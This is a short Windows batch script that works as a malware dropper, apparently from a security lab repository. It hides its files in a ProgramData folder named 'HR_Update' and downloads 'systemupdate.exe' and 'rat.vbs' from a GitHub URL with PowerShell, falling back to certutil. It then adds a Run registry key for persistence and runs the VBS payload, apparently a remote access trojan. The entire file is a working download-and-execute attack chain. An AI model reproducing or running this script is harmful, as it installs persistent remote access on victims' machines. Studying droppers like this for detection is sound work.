@echo off
:: Create hidden folder for payloads
set "payloadFolder=%ProgramData%\HR_Update"
mkdir "%payloadFolder%"

:: Attempt to download with PowerShell
powershell -Command "Invoke-WebRequest -Uri https://raw.githubusercontent.com/Oligo12/SentinelLab/main/systemupdate.exe -OutFile '%payloadFolder%\systemupdate.exe'"
powershell -Command "Invoke-WebRequest -Uri https://raw.githubusercontent.com/Oligo12/SentinelLab/main/rat.vbs -OutFile '%payloadFolder%\rat.vbs'"

:: If PowerShell failed (files don’t exist), try certutil fallback
if not exist "%payloadFolder%\systemupdate.exe" (
    certutil -urlcache -split -f https://raw.githubusercontent.com/Oligo12/SentinelLab/main/systemupdate.exe "%payloadFolder%\systemupdate.exe"
)

if not exist "%payloadFolder%\rat.vbs" (
    certutil -urlcache -split -f https://raw.githubusercontent.com/Oligo12/SentinelLab/main/rat.vbs "%payloadFolder%\rat.vbs"
)

:: Add to startup (for persistence)
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v HR_Update /t REG_SZ /d "%payloadFolder%\rat.vbs" /f

:: Run the VBS payload immediately
cscript "%payloadFolder%\rat.vbs"
